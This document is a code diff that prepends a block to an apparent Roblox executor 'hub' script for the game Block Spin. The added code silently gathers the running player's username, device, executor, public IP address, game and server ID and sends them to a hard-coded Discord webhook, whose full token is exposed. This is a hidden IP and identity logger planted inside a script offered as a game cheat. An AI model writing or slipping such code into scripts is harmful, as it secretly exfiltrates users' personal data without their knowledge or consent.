@@ -1,3 +1,131 @@
+-- EXECUTOR ONLY
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1457429217439514751/duIikdUoREKfczZ19UJiUgTQAGbWlbZQTPdOorquLpgH8qAtl0XaKAWmq_XcMMBdZ0eK"
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local Marketplace = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+
+local plr = Players.LocalPlayer
+
+-- ===== OS =====
+local function GetOS()
+    local platform = UserInputService:GetPlatform()
+    if platform == Enum.Platform.Windows then
+        return "Windows 💻"
+    elseif platform == Enum.Platform.IOS then
+        return "iOS 🍎"
+    elseif platform == Enum.Platform.Android then
+        return "Android 🤖"
+    else
+        return "Unknown"
+    end
+end
+local OS = GetOS()
+
+-- ===== Executor =====
+local executorName, executorVersion = "Unknown", ""
+pcall(function()
+    if identifyexecutor then
+        local n, v = identifyexecutor()
+        executorName = n or "Unknown"
+        executorVersion = v or ""
+    end
+end)
+local ExecutorText = executorName
+if executorVersion ~= "" then
+    ExecutorText = ExecutorText .. " | " .. executorVersion
+end
+
+-- ===== IP =====
+local function GetIP()
+    local ip = "Unknown"
+    pcall(function()
+        local res = request({
+            Url = "https://api.ipify.org",
+            Method = "GET"
+        })
+        if res and res.Body then
+            ip = res.Body
+        end
+    end)
+    return ip
+end
+local IP = GetIP()
+
+-- ===== Avatar =====
+local avatarApi =
+    "https://thumbnails.roblox.com/v1/users/avatar?userIds=" ..
+    plr.UserId .. "&size=420x420&format=Png&isCircular=false"
+local avatarResponse = game:HttpGet(avatarApi)
+local avatarJson = HttpService:JSONDecode(avatarResponse)
+local avatarUrl = avatarJson.data[1].imageUrl or ""
+
+-- ===== Map Thumbnail =====
+local mapApi =
+    "https://thumbnails.roblox.com/v1/places/gameicons?placeIds=" ..
+    game.PlaceId .. "&size=512x512&format=Png&isCircular=false"
+local mapResponse = game:HttpGet(mapApi)
+local mapJson = HttpService:JSONDecode(mapResponse)
+local mapThumbnail = mapJson.data[1].imageUrl or ""
+
+-- ===== Place =====
+local placeId = game.PlaceId
+local placeName = Marketplace:GetProductInfo(placeId).Name
+local placeLink = "https://www.roblox.com/games/" .. placeId
+
+-- ===== Time (TH) =====
+local function GetThaiTimestamp()
+    local time = os.date("!*t")
+    time.hour = (time.hour + 7) % 24
+    return string.format(
+        "%02d-%02d-%04d %02d:%02d:%02d",
+        time.day, time.month, time.year,
+        time.hour, time.min, time.sec
+    )
+end
+local timestamp = GetThaiTimestamp()
+
+-- ===== Color =====
+local color = 0
+if OS == "Windows 💻" then
+    color = 3447003
+elseif OS == "Android 🤖" then
+    color = 3066993
+elseif OS == "iOS 🍎" then
+    color = 15158332
+end
+
+-- ===== Webhook Data =====
+local data = {
+    username = "bmegono1",
+    embeds = {{
+        title = "Bmegono1HUB block spin",
+        color = color,
+        thumbnail = { url = avatarUrl },
+        image = { url = mapThumbnail },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        fields = {
+            { name = "🌠 คนใช้", value = plr.Name, inline = true },
+            { name = "📱 อุปกรณ์ที่ใช้", value = OS, inline = true },
+            { name = "🧰 Executor", value = ExecutorText, inline = false },
+            { name = "🌍 ชื่อแมพ", value = placeName, inline = false },
+            { name = "🌐 IP", value = IP, inline = false },
+            { name = "🆔 JobId", value = tostring(game.JobId), inline = false },
+            { name = "🕒 เวลาตอนรัน", value = timestamp, inline = false }
+        }
+    }}
+}
+
+-- ===== Send =====
+request({
+    Url = WEBHOOK_URL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(data)
+})
 -----------------------------------------------
 -- Services & Player (สำหรับฟังก์ชันดูเงิน / hop)
 ------------------------------------------------
